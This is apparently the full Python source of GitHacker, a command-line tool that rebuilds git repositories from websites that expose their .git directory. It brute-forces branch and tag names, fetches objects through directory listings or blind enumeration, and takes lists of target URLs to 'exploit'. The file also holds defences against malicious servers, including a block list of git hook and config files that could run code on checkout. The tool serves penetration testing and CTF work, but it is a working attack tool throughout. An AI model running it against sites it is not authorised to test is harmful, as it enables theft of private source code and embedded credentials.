import argparse
import concurrent.futures
import hashlib
import logging
import os
import re
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from urllib.parse import quote, urljoin, urlparse

import bs4
import coloredlogs
import git
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Kept in sync with pyproject.toml's project.version by bump-my-version
# (see [tool.bump-my-version.files] in pyproject.toml).
__version__ = '1.1.8'

coloredlogs.install(fmt='%(asctime)s %(levelname)s %(message)s')


def md5(data):
    return hashlib.md5(bytes(data, encoding='utf-8')).hexdigest()


# Strict subset of git-check-ref-format. Validates a single segment of a ref
# name (the part between two `/`s). Names containing `/` must be split first
# and each segment validated independently. This is the gate every ref name
# from server-controlled or user-supplied input must pass before being
# appended to default_git_files / queued, so a malicious value cannot reach
# the path-join in worker() with `..`, NUL, or absolute components.
_REF_SEGMENT_RE = re.compile(r'^[A-Za-z0-9._\-+]+\Z')

# Filesystem-path segment validator. Looser than the ref-segment gate: real
# .git filenames begin with a dot (".git", ".gitignore") and pack files use
# longer extensions, so we allow leading dot but still block "." / ".." /
# separators / control chars / NUL.
_PATH_SEGMENT_RE = re.compile(r'^[A-Za-z0-9._\-+@]+\Z')

_MAX_WORDLIST_BYTES = 1 * 1024 * 1024
_MAX_WORDLIST_ENTRIES = 100_000


def _is_safe_ref_segment(seg):
    if not isinstance(seg, str) or not seg:
        return False
    if seg in ('.', '..'):
        return False
    if seg.startswith('.') or seg.endswith('.lock'):
        return False
    return bool(_REF_SEGMENT_RE.match(seg))


def _is_safe_path_segment(seg):
    """Single trust gate for every path segment that is about to be joined
    onto temp_dst or appended to a request URL. Rejects empty / "." / ".." /
    separators / NUL / control chars; permits the dot-prefixed names that
    real .git trees use ("HEAD", ".git", "pack-<sha>.pack", etc.)."""
    if not isinstance(seg, str) or not seg:
        return False
    if seg in ('.', '..'):
        return False
    return bool(_PATH_SEGMENT_RE.match(seg))


class OriginRestrictedSession(requests.Session):
    """A requests.Session that refuses to follow cross-origin redirects.

    The remote `.git/` server is untrusted; if it answers a request with
    a 3xx pointing to a different host (or a different scheme/port),
    following it turns the pillager into an SSRF primitive — a malicious
    server can make us probe internal IPs or trigger requests against
    services that only trust the local network. Setting
    ``expected_origin`` to the (scheme, netloc) tuple of the user-provided
    URL makes ``get_redirect_target`` return ``None`` whenever the
    Location header would take us off-origin, which causes requests to
    stop following the chain.
    """

    expected_origin: tuple[str, str] | None = None

    def get_redirect_target(self, resp):
        target = super().get_redirect_target(resp)
        if not target or self.expected_origin is None:
            return target
        # Resolve relative Locations against the response URL.
        absolute = urljoin(resp.url, target)
        parsed = urlparse(absolute)
        if (parsed.scheme, parsed.netloc) != self.expected_origin:
            logging.warning(
                'refusing cross-origin redirect from %s to %s',
                resp.url,
                absolute,
            )
            return None
        return target


def _build_session(verify, threads):
    s = OriginRestrictedSession()
    s.verify = verify
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=(500, 502, 503, 504),
        allowed_methods=frozenset(['GET', 'HEAD']),
        raise_on_status=False,
    )
    pool = max(int(threads), 4)
    adapter = HTTPAdapter(
        pool_connections=pool,
        pool_maxsize=pool * 2,
        max_retries=retry,
    )
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    if not verify:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    return s


def _is_safe_sha(sha):
    return isinstance(sha, str) and bool(re.fullmatch(r'[0-9a-fA-F]{40}', sha))


def _load_ref_wordlist(path):
    """Load a ref wordlist file. Returns a list of validated segment-lists.

    Lines starting with `#` and blank lines are skipped. Names may contain
    `/` (e.g. `feature/login`); every segment is validated and the entry is
    dropped (with a warning) if any segment fails. Hard caps on file size
    and entry count guard against accidental DoS.
    """
    size = os.path.getsize(path)
    if size > _MAX_WORDLIST_BYTES:
        raise ValueError(
            f'wordlist {path} too large: {size} bytes (limit {_MAX_WORDLIST_BYTES})',
        )
    out = []
    with open(path, encoding='utf-8', errors='replace') as f:
        for raw in f:
            name = raw.strip()
            if not name or name.startswith('#'):
                continue
            segs = name.split('/')
            if not all(_is_safe_ref_segment(s) for s in segs):
                logging.warning(
                    f'Skipping unsafe wordlist entry: {name!r}',
                )
                continue
            out.append(segs)
            if len(out) >= _MAX_WORDLIST_ENTRIES:
                logging.warning(
                    'Wordlist truncated at %d entries',
                    _MAX_WORDLIST_ENTRIES,
                )
                break
    return out


class GitHacker:
    def __init__(
        self,
        url,
        dst,
        threads=0x08,
        brute=True,
        prompt_for_dangerous_files=False,
        delay=0,
        tag_wordlist=None,
        branch_wordlist=None,
        insecure=False,
    ) -> None:
        self.url = url
        self.temp_dst_path = Path(tempfile.mkdtemp())
        self.temp_dst = str(self.temp_dst_path)
        self.final_dst = dst
        self.repo = None
        self.thread_number = threads
        self.max_semanic_version = 10
        self.delay = delay
        self.brute = brute
        self.prompt_for_dangerous_files = prompt_for_dangerous_files
        self.tag_wordlist_path = tag_wordlist
        self.branch_wordlist_path = branch_wordlist
        self.session = _build_session(verify=not insecure, threads=threads)
        parsed = urlparse(url)
        self._origin = (parsed.scheme, parsed.netloc)
        self._origin_path = parsed.path or '/'
        # Lock the session's redirect-following to the same origin so an
        # untrusted server cannot use 3xx responses as an SSRF springboard
        # into the pillager's network.
        self.session.expected_origin = self._origin
        self._pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=max(int(threads), 1),
            thread_name_prefix='githacker',
        )
        # Wave-scoped task buffer: add_task() appends here, _drain() submits
        # the batch to the pool and waits for completion. Clearing per wave
        # keeps the basic→packed-refs→head→blob→fsck phase boundaries.
        self._pending: list[list[str]] = []
        self.default_git_files_maybe_dangerous = [
            ['.git', 'config'],
            ['.git', 'hooks', 'applypatch-msg'],
            ['.git', 'hooks', 'commit-msg'],
            ['.git', 'hooks', 'fsmonitor-watchman'],
            ['.git', 'hooks', 'post-update'],
            ['.git', 'hooks', 'pre-applypatch'],
            ['.git', 'hooks', 'pre-commit'],
            ['.git', 'hooks', 'pre-merge-commit'],
            ['.git', 'hooks', 'pre-push'],
            ['.git', 'hooks', 'pre-rebase'],
            ['.git', 'hooks', 'pre-receive'],
            ['.git', 'hooks', 'prepare-commit-msg'],
            ['.git', 'hooks', 'update'],
        ]

        self.default_git_files = [
            ['.git', 'COMMIT_EDITMSG'],
            ['.git', 'description'],
            ['.git', 'FETCH_HEAD'],
            ['.git', 'HEAD'],
            ['.git', 'index'],
            ['.git', 'info', 'exclude'],
            ['.git', 'logs', 'HEAD'],
            ['.git', 'logs', 'refs', 'remotes', 'origin', 'HEAD'],
            ['.git', 'logs', 'refs', 'stash'],
            ['.git', 'ORIG_HEAD'],
            ['.git', 'packed-refs'],
            ['.git', 'refs', 'remotes', 'origin', 'HEAD'],
            # git stash
            ['.git', 'refs', 'stash'],
            # pack
            ['.git', 'objects', 'info', 'alternates'],
            ['.git', 'objects', 'info', 'http-alternates'],
            ['.git', 'objects', 'info', 'packs'],
        ]

        self.complete_basic_files_list()
        self.cached_404_url: set[str] = set()

    def start(self):
        # Ensure the target is a git folder via .git/HEAD
        if self.session.head(f'{self.url}.git/HEAD').status_code != 200:
            logging.error(
                f'The target url({self.url}) is not a valid git repository, .git/HEAD not exists',
            )
            return False

        try:
            if self.directory_listing_enabled():
                return self.sighted()
            else:
                return self.blind()
        finally:
            self._pool.shutdown(wait=True)

    def directory_listing_enabled(self):
        response = self.session.get(f'{self.url}.git/')
        keywords = {
            'apache': '<title>Index of',
            'nginx': '<title>Index of',
        }
        if response.status_code == 200:
            for server, keyword in keywords.items():
                if keyword in response.text:
                    logging.info(f'Directory listing enable under: {server}')
                    return True
        return False

    def sighted(self):
        self.add_folder(self.url, '.git/')
        self._drain()
        return self.git_clone()

    def is_dangerous_git_file(self, filepath):
        # Compare on a Path so the suffix-match works regardless of which
        # separator the caller used (URL-derived "/" vs. native os.sep).
        parts = Path(filepath).parts
        # We consider all files not in self.default_git_files_maybe_dangerous
        # are safe. But that could be dangerous when git add another config
        # file someday which may lead to another RCE, so this function
        # should be more conservative to return False. Maybe a white list is
        # safer. (TODO)
        for dangerous in self.default_git_files_maybe_dangerous:
            tail = tuple(dangerous)
            if len(parts) >= len(tail) and parts[-len(tail) :] == tail:
                return True

        # The following operation will mark any files under `.git/hooks` to
        # be dangerous. Consider all git hooks could be dangerous, this
        # operation is not redundant with the previous for loop, because git
        # may add more default hook files someday. I don't want to
        # continuously maintain the maybe-dangerous blacklist.
        return len(parts) >= 3 and parts[-3:-1] == ('.git', 'hooks')

    def add_folder(self, base_url, folder):
        url = f'{base_url}{folder}'
        soup = bs4.BeautifulSoup(
            self.session.get(url).text,
            features='html.parser',
        )
        for link in soup.find_all('a'):
            href = link.get('href')
            if not href or href in ('../', '/'):
                continue
            if href.endswith('/'):
                # Validate the directory segment before recursing so a
                # malicious listing cannot drive us off-tree via "../" and
                # cousins like "....//".
                seg = href.rstrip('/')
                if not _is_safe_path_segment(seg):
                    logging.warning(
                        f'Skipping unsafe directory listing entry: {href!r}',
                    )
                    continue
                self.add_folder(url, href)
            else:
                file_url = urljoin(url, href)
                if not self._is_same_origin_descendant(file_url):
                    continue
                relative = urlparse(file_url).path[len(self._origin_path) :]
                # add_task validates each segment via _is_safe_path_segment,
                # so empty / ".." / NUL components are rejected centrally.
                self.add_task([s for s in relative.split('/') if s])

    def blind(self):
        logging.info('Downloading basic files...')
        if self.add_basic_file_tasks() > 0:
            self._drain()

        logging.info('Parsing packed-refs to expand refs...')
        if self.add_packed_refs_tasks() > 0:
            self._drain()

        logging.info('Downloading head files...')
        if self.add_head_file_tasks() > 0:
            self._drain()

        logging.info('Downloading blob files...')
        self.repo = git.Repo(self.temp_dst)
        if self.add_blob_file_tasks() > 0:
            self._drain()

        logging.info('Running git fsck files...')
        while True:
            process = subprocess.run(
                ['git', 'fsck'],
                capture_output=True,
                cwd=self.temp_dst,
            )
            tn = self.add_hashes_parsed(
                process.stdout + b'\n' + process.stderr,
            )
            if tn > 0:
                self._drain()
            else:
                break

        return self.git_clone()

    def copy_useful_files(self):
        """
        copy useful files like .git/ref/stash which will not be downloaded via git clone
        """
        final = Path(self.final_dst)
        for rel in (
            ('.git', 'COMMIT_EDITMSG'),
            # `git clone` writes a fresh .git/index from HEAD's tree,
            # dropping any blob that was staged but never committed.
            # Restore the original index so checkout-index --all can
            # re-materialize those blobs into the working tree below.
            ('.git', 'index'),
            ('.git', 'ORIG_HEAD'),
            ('.git', 'objects', 'pack'),
            ('.git', 'refs', 'stash'),
        ):
            src = self.temp_dst_path.joinpath(*rel)
            if src.exists():
                shutil.copy(src, final.joinpath(*rel))

        for rel in (('.git', 'logs'),):
            src = self.temp_dst_path.joinpath(*rel)
            dst = final.joinpath(*rel)
            shutil.rmtree(dst, ignore_errors=True)
            if src.exists():
                shutil.copytree(src, dst)

    def git_clone(self):
        logging.info(
            f'Cloning downloaded repo from {self.temp_dst} to {self.final_dst}',
        )
        result = subprocess.run(
            ['git', 'clone', self.temp_dst, self.final_dst],
            capture_output=True,
        )
        if result.stdout != b'':
            logging.info(result.stdout.decode('utf-8').strip())
        if result.stderr != b'':
            logging.error(result.stderr.decode('utf-8').strip())
        if b'invalid path' in result.stderr:
            logging.info(f'Remote repo is downloaded into {self.final_dst}')
            logging.error(
                'Be careful to checkout the source code, cause the target repo may be a honey pot.',
            )
            logging.error(
                'FYI: https://drivertom.blogspot.com/2021/08/git.html',
            )

        # TODO: check whether this operation would introduct new vulnerabilities
        self.copy_useful_files()

        if result.returncode == 0:
            # `git clone` checks out HEAD's tree, so any blob that was only
            # staged in the index (added but never committed) ends up
            # downloaded into .git/objects but absent from the working
            # tree. Re-materialize the index so those staged-only files
            # land on disk where the user expects them.
            subprocess.run(
                [
                    'git',
                    '-C',
                    self.final_dst,
                    'checkout-index',
                    '--all',
                    '--force',
                ],
                capture_output=True,
                check=False,
            )

            # return True only when git clone successfully executed
            logging.info(f'Check it out: {self.final_dst}')
            # remove temp repo folder
            shutil.rmtree(self.temp_dst)
            return True
        return False

    def _is_same_origin_descendant(self, candidate_url):
        """Strict same-origin check: scheme + netloc must match, and the
        path must descend from the configured base path. Replaces the old
        `startswith(self.url)` test, which let `evil.com.attacker.com` slip
        through whenever self.url ended at a hostname boundary."""
        try:
            parsed = urlparse(candidate_url)
        except ValueError:
            return False
        if (parsed.scheme, parsed.netloc) != self._origin:
            return False
        return parsed.path.startswith(self._origin_path)

    def add_task(self, task):
        path_components = list(task)
        # Single trust boundary for every path that will be joined onto
        # temp_dst or appended to a request URL. Anything that fails the
        # gate is dropped with a warning — see _is_safe_path_segment.
        for seg in path_components:
            if not _is_safe_path_segment(seg):
                logging.warning(
                    f'Rejected unsafe path segment {seg!r} in {path_components!r}',
                )
                return False
        url = self.construct_url_from_path_components(path_components)
        relative_path = '/'.join(path_components)
        if url in self.cached_404_url:
            logging.warning(f'{relative_path} does not exist')
            return False
        elif self.temp_dst_path.joinpath(*path_components).exists():
            logging.debug(f'{relative_path} alread existed')
            return False
        else:
            self._pending.append(path_components)
            return True

    def _drain(self):
        """Submit every task buffered since the last drain to the pool and
        block until they all complete. `fut.result()` re-raises any worker
        exception so that bugs surface instead of being swallowed."""
        if not self._pending:
            return
        tasks = self._pending
        self._pending = []
        futures = [self._pool.submit(self._fetch_one, t) for t in tasks]
        for fut in concurrent.futures.as_completed(futures):
            fut.result()

    def add_hashes_parsed(self, content):
        hashes = set(re.findall(r'([a-f\d]{40})', content.decode('utf-8')))
        n = 0
        for hash in hashes:
            path_components = ['.git', 'objects', hash[0:2], hash[2:]]
            if self.add_task(path_components):
                n += 1
        return n

    def add_packed_refs_tasks(self):
        """Parse `.git/packed-refs` (already on disk) and queue named refs.

        Recovers refs whose names cannot be brute-forced (e.g. random
        16-char branch names). Every ref name is validated per-segment via
        `_is_safe_ref_segment` before being passed into add_task, so a
        malicious server cannot turn this into path traversal.
        """
        path = self.temp_dst_path.joinpath('.git', 'packed-refs')
        if not path.exists():
            return 0
        n = 0
        with open(path, encoding='utf-8', errors='replace') as f:
            for line in f:
                line = line.rstrip('\n').rstrip('\r')
                if not line or line.startswith('#') or line.startswith('^'):
                    continue
                parts = line.split(' ', 1)
                if len(parts) != 2:
                    continue
                sha, ref = parts
                if not _is_safe_sha(sha):
                    continue
                segments = ref.split('/')
                if len(segments) < 3 or segments[0] != 'refs':
                    continue
                if not all(_is_safe_ref_segment(s) for s in segments):
                    logging.warning(
                        f'Skipping unsafe ref from packed-refs: {ref!r}',
                    )
                    continue
                if self.add_task(['.git'] + segments):
                    n += 1
                # Reflog for the ref is best-effort and may simply 404.
                self.add_task(['.git', 'logs'] + segments)
        return n

    def add_head_file_tasks(self):
        n = 0
        head_path = self.temp_dst_path.joinpath('.git', 'HEAD')
        with open(head_path) as f:
            for line in f:
                if line.startswith('ref: '):
                    ref_path = line.split('ref: ')[1].strip()
                    # ref_path is server-controlled; validate every segment
                    # before letting it reach the filesystem.
                    segments = ref_path.split('/')
                    if not all(_is_safe_ref_segment(s) for s in segments):
                        logging.warning(
                            f'Skipping unsafe HEAD ref: {ref_path!r}',
                        )
                        continue
                    file_path = self.temp_dst_path.joinpath(
                        '.git',
                        'logs',
                        *segments,
                    )
                    if file_path.exists():
                        n += self.add_hashes_parsed(file_path.read_bytes())
        return n

    def parse_current_branch_name(self):
        url = f'{self.url}.git/HEAD'
        response = self.session.get(url)
        # TODO: [a-zA-Z\d_-]+ is not sufficient for matching a branch name [1,2].
        # For example, a branch which named as `issue-10` cannot be matched.
        # References
        # [1] https://stackoverflow.com/a/67151923
        # [2] https://github.com/git/git/blob/v2.37.1/refs.c#L38-L57
        branch_names = re.findall(
            r'ref: refs/heads/([a-zA-Z\d_-]+)',
            response.text,
        )
        if len(branch_names) > 1:
            raise ValueError(
                f'unexpected multiple HEAD refs at {url}: {branch_names!r}',
            )
        return branch_names

    def parse_logged_branch_names(self):
        url = f'{self.url}.git/logs/HEAD'
        response = self.session.get(url)
        # TODO: [a-zA-Z\d_-]+ is not sufficient for matching a branch name [1,2].
        # For example, a branch which named as `issue-10` cannot be matched.
        # References
        # [1] https://stackoverflow.com/a/67151923
        # [2] https://github.com/git/git/blob/v2.37.1/refs.c#L38-L57
        branch_names = re.findall(
            r'checkout: moving from ([a-zA-Z\d_-]+) to ([a-zA-Z\d_-]+)',
            response.text,
        )
        branch_names_uniq = list(
            set([i[0] for i in branch_names] + [i[1] for i in branch_names]),
        )
        return branch_names_uniq

    def _tag_brute_names(self):
        """Yield tag names tried in --brute mode. All values are constructed
        from bounded loops over digits/letters, so they pass _is_safe_ref_segment
        by construction; we still validate to keep one gate for everything.
        """
        n = self.max_semanic_version
        for major in range(n):
            for minor in range(n):
                for patch in range(n):
                    yield f'v{major}.{minor}.{patch}'
                    yield f'{major}.{minor}.{patch}'
                yield f'v{major}.{minor}'
                yield f'{major}.{minor}'
            yield f'v{major}'
            yield f'{major}'
        yield from (
            'latest',
            'stable',
            'release',
            'rc',
            'beta',
            'alpha',
            'preview',
            'prod',
            'hotfix',
        )
        for year in range(2015, 2031):
            yield f'{year}'
            for month in range(1, 13):
                yield f'{year}.{month:02d}'

    def complete_basic_files_list(self):
        # git tags
        if self.brute:
            tag_names = list(self._tag_brute_names())
        else:
            tag_names = ['v0.0.1', '0.0.1', 'v1.0.0', '1.0.0']

        if self.tag_wordlist_path:
            for segs in _load_ref_wordlist(self.tag_wordlist_path):
                if len(segs) == 1:
                    tag_names.append(segs[0])
                else:
                    self.default_git_files.append(
                        ['.git', 'refs', 'tags', *segs],
                    )

        for name in tag_names:
            if not _is_safe_ref_segment(name):
                logging.warning(f'Skipping unsafe tag name: {name!r}')
                continue
            self.default_git_files.append(['.git', 'refs', 'tags', name])

        branch_names = [
            'daily',
            'dev',
            'develop',
            'development',
            'feature',
            'feat',
            'fix',
            'hotfix',
            'issue',
            'main',
            'master',
            'ng',
            'preprod',
            'prod',
            'production',
            'quickfix',
            'release',
            'staging',
            'test',
            'testing',
            'trunk',
            'wip',
        ]

        # parse current branch name in `.git/HEAD`
        branch_names += self.parse_current_branch_name()

        # extract branch names from branch changing logs in `.git/logs/HEAD`
        branch_names += self.parse_logged_branch_names()

        if self.branch_wordlist_path:
            for segs in _load_ref_wordlist(self.branch_wordlist_path):
                if len(segs) == 1:
                    branch_names.append(segs[0])
                else:
                    for prefix in (
                        ['.git', 'logs', 'refs', 'heads'],
                        ['.git', 'logs', 'refs', 'remotes', 'origin'],
                        ['.git', 'refs', 'remotes', 'origin'],
                        ['.git', 'refs', 'heads'],
                    ):
                        self.default_git_files.append(prefix + segs)

        # Validate every branch name once before fanning out to folders.
        # Server-controlled names from parse_current_branch_name /
        # parse_logged_branch_names land here too, so this is the trust
        # boundary — anything failing the check is dropped with a warning.
        safe_branch_names = []
        for branch_name in branch_names:
            if not _is_safe_ref_segment(branch_name):
                logging.warning(
                    f'Skipping unsafe branch name: {branch_name!r}',
                )
                continue
            safe_branch_names.append(branch_name)

        # git remote branches
        expand_branch_name_folder = [
            ['.git', 'logs', 'refs', 'heads', None],
            ['.git', 'logs', 'refs', 'remotes', 'origin', None],
            ['.git', 'refs', 'remotes', 'origin', None],
            ['.git', 'refs', 'heads', None],
        ]

        for folder in expand_branch_name_folder:
            for branch_name in safe_branch_names:
                folder_copy = folder.copy()
                folder_copy[-1] = branch_name
                self.default_git_files.append(folder_copy)

    def add_basic_file_tasks(self):
        n = 0
        for item in self.default_git_files:
            if self.add_task(item):
                n += 1
        for item in self.default_git_files_maybe_dangerous:
            if self.add_task(item):
                n += 1
        return n

    def add_blob_file_tasks(self):
        n = 0
        for _, blob in self.repo.index.iter_blobs():
            hash = blob.hexsha
            path_components = ['.git', 'objects', hash[0:2], hash[2:]]
            if self.add_task(path_components):
                n += 1
        return n

    def construct_url_from_path_components(self, path_components):
        # Percent-encode each segment defensively. add_task already rejects
        # anything outside [A-Za-z0-9._\-+@] so this never re-encodes valid
        # input, but it keeps the URL well-formed if validation ever drifts.
        url_path = '/'.join(quote(seg, safe='') for seg in path_components)
        return f'{self.url}{url_path}'

    def _fetch_one(self, path_components):
        # Skip the all-zero "null" SHA reflog entries — they're not real objects.
        if '00000000000000000000000000000000000000' in path_components:
            return
        fs_path = self.temp_dst_path.joinpath(*path_components)
        if fs_path.exists():
            return
        url = self.construct_url_from_path_components(path_components)
        status_code, length, result = self.wget(url, fs_path)
        log = logging.info if result else logging.error
        log(f'[{length} bytes] {status_code} {url[len(self.url) :]}')

    def check_file_content(self, content):
        return not (content.startswith(b'<') or len(content) == 0)

    def wget(self, url, path):
        time.sleep(self.delay)
        response = self.session.get(url)
        # record 404 files to prevent infinite downloading loop (#25)
        if response.status_code == 404:
            self.cached_404_url.add(url)

        path = Path(path)
        is_dangerous = self.is_dangerous_git_file(str(path))

        # When the user has not opted in to manual confirmation we silently
        # skip anything that could RCE on checkout (config/hooks/etc.).
        if not self.prompt_for_dangerous_files and is_dangerous:
            logging.error(
                f'{path} is potential dangerous, skip downloading this file',
            )
            return (-1, -1, False)

        try:
            path.parent.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            logging.error(f'mkdir({path.parent!r}) failed: {e!r}')
            return (-1, -1, False)
        status_code = response.status_code
        content = response.content
        result = False
        if status_code == 200 and self.check_file_content(content):
            if self.prompt_for_dangerous_files and is_dangerous:
                logging.error(
                    f'{path} is potential dangerous, you need to confirm the content is safe.',
                )
                seperator = f'{"-" * 0x10} {path} {"-" * 0x10}'
                logging.warning(seperator)
                print(content.decode('utf-8'))
                safe = (
                    input(
                        f'Are you sure that the content of {path} is safe? (y/N)',
                    )
                    .strip()
                    .lower()
                    == 'y'
                )
                if safe:
                    n = path.write_bytes(content)
                    if n == len(content):
                        result = True
                else:
                    logging.warning(
                        f'{path} is marked as dangerous, it will not be downloaded.',
                    )
                    result = False
            else:
                n = path.write_bytes(content)
                if n == len(content):
                    result = True
        return (status_code, len(content), result)


def remove_suffixes(s, suffixes):
    r = s
    for suffix in suffixes:
        if s.endswith(suffix):
            suffix_length = len(suffix)
            r = s[0:-suffix_length]
    return r


def append_if_not_exists(s, suffix):
    if not s.endswith(suffix):
        return s + suffix
    return s


def main():
    parser = argparse.ArgumentParser(description='GitHacker')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '--url',
        help='url of the target website which expose .git folder',
    )
    group.add_argument(
        '--url-file',
        help='url file that contains a list of urls of the target website which expose .git folder',
    )
    parser.add_argument(
        '--output-folder',
        required=True,
        help='the local folder which will be the parent folder of all exploited repositories, '
        'every repo will be stored in folder named md5(url).',
    )
    parser.add_argument(
        '--brute',
        required=False,
        default=False,
        help='enable brute forcing branch/tag names',
        action='store_true',
    )
    parser.add_argument(
        '--tag-wordlist',
        required=False,
        default=None,
        help='extra tag names file (one per line, # comments allowed)',
    )
    parser.add_argument(
        '--branch-wordlist',
        required=False,
        default=None,
        help='extra branch names file (one per line, # comments allowed)',
    )
    parser.add_argument(
        '--enable-manually-check-dangerous-git-files',
        required=False,
        default=False,
        help='disable manually check dangerous git files which may lead to *RCE* '
        '(eg: .git/config, .git/hook/pre-commit) when downloading malicious .git folders. '
        'If this argument is given, GitHacker will not download the files which may be dangerous at all.',
        action='store_true',
    )
    parser.add_argument(
        '--threads',
        required=False,
        default=0x04,
        type=int,
        help='threads number to download from internet',
    )
    parser.add_argument(
        '--delay',
        required=False,
        default=0,
        type=float,
        help='delay seconds between HTTP requests',
    )
    parser.add_argument(
        '--insecure',
        required=False,
        default=False,
        action='store_true',
        help='disable TLS certificate verification (default: verify enabled)',
    )
    parser.add_argument('--version', action='version', version=__version__)
    args = parser.parse_args()

    if args.delay != 0:
        args.threads = 1

    urls = []
    if args.url:
        urls.append(args.url)
    elif args.url_file:
        with open(args.url_file) as f:
            for line in f:
                url = line.strip()
                if url:
                    urls.append(url)

    succeed_urls = []
    logging.info(f'{len(urls)} urls to be exploited')
    for url in urls:
        folder = os.path.join(args.output_folder, md5(url))
        logging.info(f'Exploiting {url} into {folder}')
        result = GitHacker(
            url=append_if_not_exists(
                remove_suffixes(url, ['.git', '.git/']),
                '/',
            ),
            dst=folder,
            threads=args.threads,
            brute=args.brute,
            prompt_for_dangerous_files=args.enable_manually_check_dangerous_git_files,
            delay=args.delay,
            tag_wordlist=args.tag_wordlist,
            branch_wordlist=args.branch_wordlist,
            insecure=args.insecure,
        ).start()
        if result:
            succeed_urls.append(url)

    logging.info(
        f'{len(succeed_urls)} / {len(urls)} were exploited successfully',
    )
    for url in succeed_urls:
        folder = os.path.join(args.output_folder, md5(url))
        logging.info(f'{url} -> {folder}')


if __name__ == '__main__':
    main()
